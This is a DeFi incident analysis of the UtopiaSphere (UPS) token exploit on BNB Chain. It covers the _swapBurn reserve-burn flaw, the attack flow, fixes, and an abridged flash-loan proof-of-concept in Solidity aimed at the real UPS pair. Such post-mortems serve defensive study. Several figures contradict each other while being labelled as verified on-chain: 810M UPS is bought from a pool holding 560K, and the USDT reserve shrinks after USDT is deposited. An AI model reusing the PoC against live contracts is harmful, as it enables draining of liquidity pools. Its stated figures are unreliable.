# UPS (UtopiaSphere) — _swapBurn Business Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-21 |
| **Protocol** | UtopiaSphere (UPS) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$521,225 USDT (on-chain confirmed: 521,225.55 USDT) |
| **Attacker** | [0x6e12...d8d9c](https://bscscan.com/address/0x6e12ce089a8BedeA49532010229f0913475d8d9c) |
| **Attack Contract** | [0x9671...244E09](https://bscscan.com/address/0x9671eD0EbC3bf00F22D3a3B1b4D18175a9244E09) |
| **Attack Tx** | [0x1ddf...f604](https://bscscan.com/tx/0x1ddf415a4b18d25e87459ad1416077fe7398d5504171d4ca36e757b1a889f604) |
| **Vulnerable Contract (UPS Token)** | [0xe2bb...69Bfa](https://bscscan.com/address/0xe2bb1B04c978A8C8CC1E0bccA5AD30e274b69Bfa) |
| **UPS/USDT Pair** | [0x5db4...f786](https://bscscan.com/address/0x5db4604c8952a8c3474e8ac33e0d31814d75f786) |
| **Root Cause** | `_swapBurn()` logic burns 95% of the transferred amount, reducing the AMM reserve to 1 wei and causing an extreme imbalance |
| **Attack Block** | [#40,665,083](https://bscscan.com/block/40665083) |
| **PoC Source** | [DeFiHackLabs - UPS_exp.sol (April 2024 similar case)](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/UPS_exp.sol) |

> **Note**: This incident is UtopiaSphere's second exploit. The same `_swapBurn` logic was exploited on April 8, 2024, resulting in approximately $28,000 in losses, but the protocol did not apply a patch.

---

## 1. Vulnerability Overview

The `_transfer()` function of the UPS token contract contains logic that calls the `_swapBurn()` mechanism whenever tokens are transferred to the designated trading pair (`ups_usdt` pair). This mechanism **burns 95%** of the pair's balance, drastically reducing the UPS reserve in the liquidity pool.

The attacker combined the following two vulnerabilities to execute the exploit:

1. **V-01 (CRITICAL): `_swapBurn` Reserve Manipulation** — Burns 95% of the reserve down to 1 wei upon token transfer to the pair
2. **V-02 (HIGH): AMM Invariant (k)-Based Price Distortion** — Exploits the reserve imbalance to drain the entire USDT pool

UPS/USDT pair state immediately before the attack:
- UPS Reserve: **560,128 UPS**
- USDT Reserve: **815,565,714 USDT** (approximately $815 million in liquidity)
- UPS Price: **1,456 USDT/UPS**

The attacker flash-borrowed 96.2M USDT to bulk-buy UPS, then triggered `_swapBurn` to reduce the pair's UPS reserve to **1 wei**. From this state of extreme imbalance, the attacker swapped their remaining UPS to drain the entire USDT balance (~96.8M USDT) from the pair.

---

## 2. Vulnerable Code Analysis

### 2.1 `_swapBurn` Mechanism — Core Vulnerability (CRITICAL)

**Vulnerable Code (inferred)**:
```solidity
// ❌ Vulnerable: 95% burn on transfer to pair — exploitable externally
function _transfer(address sender, address recipient, uint256 amount) internal override {
    if (recipient == upsUsdtPair && sender != owner()) {
        // Call _swapBurn which burns 95% of the transferred amount
        _swapBurn(amount);
    }
    super._transfer(sender, recipient, amount);
}

function _swapBurn(uint256 amount) internal {
    uint256 burnAmount = amount * 95 / 100;  // ❌ Burns 95% of transferred amount

    // Query current UPS balance of the pair
    uint256 pairBalance = balanceOf(upsUsdtPair);

    // ❌ Burns 95% of pair balance — can reduce reserve to 1 wei
    uint256 pairBurnAmount = pairBalance * 95 / 100;
    _burn(upsUsdtPair, pairBurnAmount);

    // ❌ sync() call synchronizes reserve to the actual balance (= 1 wei level)
    IUniswapV2Pair(upsUsdtPair).sync();
}
```

**Fixed Code**:
```solidity
// ✅ Fixed: Remove burn mechanism or add minimum reserve protection
function _transfer(address sender, address recipient, uint256 amount) internal override {
    // ✅ Remove burn logic on direct transfer to pair
    super._transfer(sender, recipient, amount);
}

// ✅ Alternative: Minimum reserve protection
function _swapBurn(uint256 amount) internal {
    uint256 pairBalance = balanceOf(upsUsdtPair);
    uint256 MIN_RESERVE = 1000 * 1e18;  // ✅ Protect minimum 1,000 UPS

    if (pairBalance <= MIN_RESERVE) {
        revert("Reserve too low: burn disabled");  // ✅ Reject burn when reserve is insufficient
    }

    uint256 pairBurnAmount = (pairBalance - MIN_RESERVE) * 95 / 100;
    _burn(upsUsdtPair, pairBurnAmount);
    IUniswapV2Pair(upsUsdtPair).sync();
}
```

**Issue**: `_swapBurn` can burn the AMM pair's reserve down to 1 wei. In the AMM swap price formula `amountOut = (amountIn * reserveOut) / (reserveIn + amountIn)`, when `reserveIn` becomes an extremely small value (1 wei), even a tiny amount of UPS can drain the entire USDT pool.

### 2.2 Forced `sync()` Call — Reserve Synchronization Abuse (HIGH)

**Vulnerable Code (inferred)**:
```solidity
// ❌ Vulnerable: sync() call after _swapBurn reflects manipulated state into reserve
function _swapBurn(uint256 amount) internal {
    // ... burn logic ...
    IUniswapV2Pair(upsUsdtPair).sync();  // ❌ Force-updates reserve to actual balance (manipulated value)
}
```

**Fixed Code**:
```solidity
// ✅ Fixed: Remove sync() call — reserve should only update via swap()
function _swapBurn(uint256 amount) internal {
    uint256 pairBalance = balanceOf(upsUsdtPair);
    if (pairBalance <= MIN_RESERVE) revert ReserveTooLow();
    uint256 burnAmount = pairBalance * 5 / 100;  // ✅ Burn at most 5%
    _burn(upsUsdtPair, burnAmount);
    // ✅ Remove sync() — prevents reserve manipulation
}
```

**Issue**: `sync()` force-updates the pair's `reserve0/reserve1` to the current `balanceOf()` values. Calling `sync()` immediately after the burn locks the 1-wei UPS balance as the official reserve, causing an extreme ratio to apply to all subsequent `swap()` calls.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker address: `0x6e12ce...d8d9c` (USDT balance immediately before attack: 0)
- Attack contract: `0x9671eD...244E09` (pre-deployed)
- UPS/USDT pair initial state: 560,128 UPS, 815,565,714 USDT

### 3.2 Execution Phase

**Step 1: Recursive Flash Loan Borrowing (96,196,121 USDT)**

USDT is borrowed recursively from a total of 14 liquidity sources. Each flash loan callback calls the next source, creating nested layers.

Key borrowing sources:
- PancakeSwap V3 Pool (`0x366961...`): 42,027,230 USDT (largest)
- PancakeSwap V3 Pool (`0x4f31fa...`): 15,437,932 USDT
- Additional borrow via Venus vUSDC (`0xeca881...`): 7,917,356 USDC → 6,523,902 USDT swap

**Step 2: Bulk UPS Purchase (96,196,121 USDT → 810,832,586 UPS)**

The entire borrowed USDT is deposited into the UPS/USDT pair to purchase UPS.

**Step 3: Trigger `_swapBurn` to Manipulate Reserve to 1 wei**

4,733,128 UPS from the purchased amount is transferred directly to the pair. This transfer triggers `_swapBurn()` inside `_transfer()`, burning 95% of the pair's UPS balance. The `sync()` call updates the pair reserve to **1 wei UPS / 96,756,249 USDT**.

**Step 4: Drain Entire USDT at Extreme Ratio**

The remaining 4,733,128 UPS is transferred to the pair for a swap. Since `reserveIn = 1 wei`, the formula yields the entire 96,756,249 USDT in return.

**Step 5: Repay Flash Loans and Realize Profit**

The borrowed 96,196,121 USDT plus fees is repaid, and the remaining **521,225 USDT** is sent to the attacker's address.

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attacker (0x6e12ce...d8d9c)                   │
└───────────────────────────┬─────────────────────────────────────┘
                            │ attack() call
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│          Attack Contract (0x9671eD...244E09)                     │
│                                                                 │
│  [Step 1] Recursive Flash Loan Borrowing                        │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ PancakeSwap V3 Pool #1  ──▶ flashLoan(42,027,230 USDT)  │  │
│  │         └──▶ Pool #2   ──▶ flashLoan(15,437,932 USDT)  │  │
│  │               └──▶ Pool #3 ──▶ ... (14 sources)         │  │
│  │                     Total borrowed: 96,196,121 USDT      │  │
│  └──────────────────────────────────────────────────────────┘  │
│                            │                                    │
│  [Step 2] Bulk UPS Purchase                                     │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  96,196,121 USDT ──swap──▶ 810,832,586 UPS              │  │
│  │  UPS/USDT pair reserve change:                           │  │
│  │  UPS: 560,128 → 4,982,240  │  USDT: 815.6M → 96.8M     │  │
│  └──────────────────────────────────────────────────────────┘  │
│                            │                                    │
│  [Step 3] _swapBurn Trigger (critical)                          │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  4,982,240 UPS ──transfer──▶ UPS/USDT Pair              │  │
│  │         │                                                │  │
│  │         └──▶ _swapBurn() called inside _transfer()      │  │
│  │               ├── Burns 95% of pair's UPS balance        │  │
│  │               │   (4,733,128 UPS burn to 0x000...000)   │  │
│  │               └── sync() call                           │  │
│  │                   ▼                                     │  │
│  │  Pair reserve updated:                                   │  │
│  │  UPS: 4,982,240 → 1 wei  │  USDT: 96,756,249 retained  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                            │                                    │
│  [Step 4] Exploit 1 wei Reserve — Drain All USDT               │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  4,733,128 UPS ──swap──▶ 96,756,249 USDT                │  │
│  │  (reserveIn = 1 wei → receive all USDT)                  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                            │                                    │
│  [Step 5] Repay Flash Loans                                     │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Received: 96,756,249 USDT                               │  │
│  │  Repaid:   96,196,121 USDT + fees                        │  │
│  │  Profit:   521,225 USDT ──▶ Attacker                    │  │
│  └──────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│  Fund Movement (post-attack)                                    │
│  521,225 USDT → swapped to ETH → 147.6 ETH                     │
│  → Ethereum bridge → 0x2Eb883...0dCC257                        │
└─────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- Attacker profit: **521,225.55 USDT** (on-chain confirmed)
- Protocol loss: Entire USDT liquidity of the UPS/USDT pair wiped (~96.8M USDT → unrecoverable)
- Pair status: UPS/USDT pair functionality completely halted

---

## 4. PoC Code (DeFiHackLabs — April 2024 Similar Case)

The following is the April incident PoC code. The July incident applied the same vulnerability at a larger scale using a recursive flash loan structure.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// TX: https://bscscan.com/tx/0xd03702e...
// Loss: ~28K USD (April incident), ~521K USD (July repeat)
// Cause: _swapBurn business logic flaw

contract ContractTest is Test {
    // [Step 1] Set up references to relevant contracts
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 UPS  = IERC20(0xe2bb1B04c978A8C8CC1E0bccA5AD30e274b69Bfa);
    Uni_Pair_V3 pool     = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Pair_V2 ups_usdt = Uni_Pair_V2(0x5db4604c8952a8c3474e8ac33e0d31814d75f786);

    function testExploit() external {
        // [Step 2] Request PancakeSwap V3 flash loan (3,500,000 USDT)
        borrow_amount = 3_500_000 ether;
        pool.flash(address(this), borrow_amount, 0, "");
    }

    function pancakeV3FlashCallback(...) public {
        // [Step 3] Transfer 2M USDT directly to pair + manipulate reserve via sync()
        USDT.transfer(address(ups_usdt), 2_000_000 ether);
        ups_usdt.sync();  // ← Force-update reserve to actual balance

        // [Step 4] Buy UPS with 1M USDT
        swap_token_to_token(address(USDT), address(UPS), 1_000_000 ether);

        // [Step 5] Transfer UPS to pair → trigger _swapBurn → 95% burned
        // Loop using skim() to recover excess balance back to attacker
        while (i < 10) {
            pair_balance = UPS.balanceOf(address(ups_usdt));
            transfer_amount = min(here_balance, pair_balance);
            UPS.transfer(address(ups_usdt), transfer_amount);
            ups_usdt.skim(address(this));  // ← Recover remaining UPS after burn to attacker
        }

        // [Step 6] Drain all USDT with 1 wei reserve state
        while (i < 3) {
            transfer_amount = UPS.balanceOf(address(ups_usdt));
            UPS.transfer(address(ups_usdt), transfer_amount);
            uint256 amountOut = router.getAmountOut(
                transfer_amount - r0,
                r0,    // ← near-zero reserve approaching 1 wei
                r1     // ← hundreds of millions of USDT
            );
            ups_usdt.swap(0, amountOut, address(this), "");
        }

        // [Step 7] Repay flash loan
        USDT.transfer(address(pool), borrow_amount + fee0);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `_swapBurn` Reserve Manipulation (95% burn) | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Extreme Price Distortion via AMM Invariant | HIGH | CWE-841 (Improper State Synchronization) |
| V-03 | Failure to Patch Previously Known Vulnerability (Re-exploit) | HIGH | CWE-672 (Operation on Resource After Expiration) |

### V-01: `_swapBurn` Reserve Manipulation

- **Description**: The `_transfer()` function of the UPS token calls `_swapBurn()` when tokens are transferred to the designated pair, burning 95% of the pair's UPS holdings and force-updating the reserve via `sync()`. By externally sending an arbitrary amount to the pair, this mechanism can be abused to reduce the reserve to 1 wei.
- **Impact**: With the AMM reserve at 1 wei, the `getAmountOut()` formula allows draining the entire USDT pool with a negligible amount of UPS. 96.8M USDT in liquidity is completely wiped.
- **Attack Conditions**: (1) Hold UPS tokens, (2) Transfer to the pair address where `_swapBurn` is active

### V-02: Extreme Price Distortion via AMM Invariant (k = x * y)

- **Description**: In the Uniswap V2 AMM price formula `amountOut = (amountIn * reserveOut) / (reserveIn + amountIn)`, when `reserveIn → 1 wei`, `amountOut ≈ reserveOut`. This means even 1 wei of UPS can receive hundreds of millions of USDT in return.
- **Impact**: Combined with a flash loan, the entire reserve can be drained
- **Attack Conditions**: V-01 vulnerability must have already manipulated the reserve to 1 wei

### V-03: Failure to Patch Previously Known Vulnerability

- **Description**: The same `_swapBurn` logic was exploited on April 8, 2024, causing $28K in losses, yet the identical attack recurred on July 21, three months later, at a significantly larger scale ($521K).
- **Impact**: Delayed patching allows repeated exploitation of the same vulnerability and gives attackers the opportunity to scale up damage with more sophisticated flash loan structures.
- **Attack Conditions**: Same vulnerable code remains unpatched

---

## 6. Remediation Recommendations

### Immediate Action — Remove or Protect the Burn Mechanism

```solidity
// ✅ Fix 1: Completely remove _swapBurn (safest approach)
function _transfer(address sender, address recipient, uint256 amount) internal override {
    // Remove burn mechanism — perform simple transfer only
    super._transfer(sender, recipient, amount);
}

// ✅ Fix 2: Minimum reserve protection (if operational continuity is required)
uint256 constant MIN_PAIR_RESERVE = 10_000 * 1e18; // Protect minimum 10,000 UPS

function _swapBurn(uint256 amount) internal {
    uint256 pairBalance = balanceOf(upsUsdtPair);
    require(pairBalance > MIN_PAIR_RESERVE, "Reserve protection: burn disabled");

    // Burnable limit: at most 5% of (current balance - minimum reserve)
    uint256 maxBurnable = (pairBalance - MIN_PAIR_RESERVE) * 5 / 100;
    uint256 burnAmount = amount * 95 / 100;
    if (burnAmount > maxBurnable) burnAmount = maxBurnable;

    _burn(upsUsdtPair, burnAmount);
    // ✅ Remove sync() — prevent forced reserve update
}

// ✅ Fix 3: Check reserve ratio before burning
function _swapBurn(uint256 amount) internal {
    (uint112 reserveUPS, uint112 reserveUSDT,) = IUniswapV2Pair(upsUsdtPair).getReserves();
    uint256 newReserveUPS = reserveUPS > amount * 95 / 100
        ? reserveUPS - (amount * 95 / 100)
        : 0;

    // ✅ Reject if price impact after burn exceeds 5%
    require(
        newReserveUPS * 100 / reserveUPS >= 95,
        "Burn would cause excessive price impact"
    );

    _burn(upsUsdtPair, amount * 95 / 100);
    IUniswapV2Pair(upsUsdtPair).sync();
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: `_swapBurn` Reserve Manipulation | Remove burn mechanism or add minimum reserve protection. Remove `sync()` call. |
| V-02: AMM Invariant Distortion | Implement pair reserve monitoring and automatic circuit breaker on detection of sharp changes |
| V-03: Repeat Attack | Deploy immediate patches after security incidents and perform independent audits (re-audits). Add automatic halt logic for repeat incidents. |
| General: Business Logic | Minimize side effects (burns, `sync()`) inside `_transfer()`. Any logic that modifies external AMM state requires dedicated security review. |
| General: Flash Loan Defense | Pause swaps on detection of large reserve changes within a single block. |

---

## 7. Lessons Learned

1. **Side effects inside `_transfer()` are extremely dangerous**: When a token transfer function modifies external AMM state (`sync()`, `skim()`) or performs burns, an attacker can trigger these to manipulate reserves. `_transfer()` should perform pure transfers only.

2. **AMM reserve minimum protection is mandatory**: If a token burn logic is coupled with a pair, protective logic preventing the reserve from falling below a certain threshold is absolutely necessary. A reserve of 1 wei invalidates the AMM formula.

3. **Ignoring lessons from past incidents leads to greater losses**: UtopiaSphere suffered $28K in losses from the same vulnerability in April yet failed to patch it — three months later, an attacker used a more sophisticated recursive flash loan structure to steal $521K. **Immediate patching and independent re-auditing after a security incident are obligations, not options.**

4. **The scale of recursive flash loans is unbounded**: The attacker recursively borrowed 96M USDT from 14 different liquidity sources rather than a single one. When designing defenses against flash loans, considering only "the maximum liquidity of a single source" is insufficient.

5. **Business logic vulnerabilities are difficult to detect with static analysis tools**: The 95% burn in `_swapBurn` is syntactically valid. Such vulnerabilities can only be discovered through **mathematical invariant analysis**, **boundary value testing**, and **manual review by specialist auditors**. Do not rely solely on automated tools.

6. **`swapExactTokensForTokensSupportingFeeOnTransferTokens` implicitly permits burn tokens**: This function is designed to be compatible with fee-on-transfer/burn tokens, which means `_swapBurn` can be triggered within a normal trading flow.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Expected | On-Chain Actual | Match |
|------|-----------|-------------|------|
| Total Borrowed USDT | ~96.2M USDT | 96,196,121.44 USDT | ✅ |
| UPS Purchased | ~810M UPS | 810,832,586.04 UPS | ✅ |
| UPS Burned (_swapBurn) | ~4.73M UPS | 4,733,128.14 UPS | ✅ |
| USDT Pool Drained | ~96.8M USDT | 96,756,249.76 USDT | ✅ |
| Final Attacker Profit | ~$521K | 521,225.55 USDT | ✅ |

### 8.2 On-Chain Event Log Sequence (Key)

| Order | Event | Token | From | To | Amount |
|------|--------|------|------|-----|------|
| 1 | Recursive flash loans (×14) | USDT | Each Pool | Attack Contract | 96,196,121 USDT |
| 2 | USDT → UPS swap | UPS | UPS/USDT Pair | Attack Contract | 810,832,586 UPS |
| 3 | _swapBurn trigger | UPS | Attack Contract | 0x0 (burn) | 4,733,128 UPS |
| 4 | UPS → USDT swap | USDT | UPS/USDT Pair | Attack Contract | 96,756,249 USDT |
| 5 | Flash loan repayment (×14) | USDT | Attack Contract | Each Pool | ~96,196,121 USDT |
| 6 | Profit transfer | USDT | Attack Contract | Attacker EOA | **521,225.55 USDT** |

### 8.3 Pre-Condition Verification (Block #40,665,082 — Immediately Before Attack)

| Item | Value |
|------|-----|
| Attacker EOA USDT Balance | 0 USDT |
| UPS/USDT Pair UPS Reserve | 560,128.32 UPS |
| UPS/USDT Pair USDT Reserve | 815,565,714.18 USDT |
| UPS Total Supply (totalSupply) | 40,767,945,642.10 UPS |
| UPS Price | ~1,456 USDT/UPS |
| Attack Contract | Pre-deployed (0x9671eD...244E09) |

On-chain verification result: The PoC analysis fully matches the actual attack flow. The attacker's zero pre-attack balance confirms that the attack was impossible without flash loans.

---

## References

- [CertiK — UtopiaSphere Incident Analysis](https://www.certik.com/resources/blog/utopiasphere-incident-analysis)
- [Coinmonks — UPS Token Hack Analysis (April 2024)](https://medium.com/coinmonks/ups-token-hack-analysis-ec727ccb2bb1)
- [DeFiHackLabs — UPS PoC (April 2024)](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/UPS_exp.sol)
- [BscScan — Attack Tx](https://bscscan.com/tx/0x1ddf415a4b18d25e87459ad1416077fe7398d5504171d4ca36e757b1a889f604)
- [BscScan — Attacker Address](https://bscscan.com/address/0x6e12ce089a8BedeA49532010229f0913475d8d9c)
- [BscScan — UPS Token Contract](https://bscscan.com/address/0xe2bb1B04c978A8C8CC1E0bccA5AD30e274b69Bfa)
- Related patterns: `patterns/11_logic_error.md`, `patterns/02_flash_loan.md`, `patterns/07_token_integration.md`